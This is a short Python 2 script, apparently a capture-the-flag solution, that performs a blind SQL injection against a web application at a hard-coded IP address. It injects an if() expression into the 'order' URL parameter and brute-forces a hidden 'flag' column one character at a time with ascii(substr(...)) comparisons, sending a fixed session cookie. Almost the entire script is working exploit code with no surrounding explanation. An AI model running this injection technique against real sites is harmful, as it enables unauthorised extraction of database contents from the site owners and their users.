# -*- coding:utf-8 -*-
__author__ = 'angelwhu'

import binascii
import requests
import sys

session = requests.Session()

def test(input):
    url = "http://202.120.7.197/app.php?action=search&keyword=&order=if(" + input + ",name,price)"
    print url
    headers = {"Accept-Encoding": "gzip, deflate",
               "Accept-Language": "en-US,en;q=0.5",
               "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0",
               "cookie":"PHPSESSID=0k3dt4k70kkabuha8s50hsnb83",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive"}
    response = session.get(url, headers=headers)
    #print response.text
    return ("\"id\":\"3\"" in response.text[:35])

def brute_force_expr(expr):
    ch_i=1
    ascii_i=40 #(
    word = ""
    while True:
        found_char=False
        while(ascii_i<=126): #~
            #res = test("ascii(substring(("+expr+"),"+str(ch_i)+",1))="+str(ascii_i))
            #test_char = "0x"+binascii.hexlify(chr(ascii_i))
            #ascii(substring((select(select(flag)from(ce63e444b0d049e9c899c9a0336b3c59))),str(ch_i),1))like(test_char)
            payload = "ascii(substr((select(flag)from(ce63e444b0d049e9c899c9a0336b3c59)),"+str(ch_i)+",1))like("+str(ascii_i)+")"
            #print payload
            res = test(payload)
            if(res):
                word += chr(ascii_i)
                print "Found (",ch_i,") ",chr(ascii_i)," - ",word
                found_char = True
                break
            ascii_i+=1

        if(not found_char):
            print "No char at index ",ch_i," .. ending string construction.."
            break

        ascii_i = 40
        ch_i+=1
    return word

print brute_force_expr(sys.argv[1]) #Replacement fix the spaces problem!
